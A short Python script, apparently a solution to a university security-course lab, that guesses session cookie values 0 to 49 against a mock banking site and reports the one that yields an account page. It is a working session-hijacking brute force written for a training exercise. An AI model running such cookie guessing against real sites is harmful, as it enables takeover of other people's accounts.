import requests

url = "https://bank.csci3403.com/" 
cookie_name = "session_token"

for i in range(50):
    cookies = {cookie_name: str(i)} 
    response = requests.get(url, cookies=cookies)
    if "moneybags" in response.text or "Balance" in response.text:
        print(f"FOUND: {i}")
        print(cookies)
        break

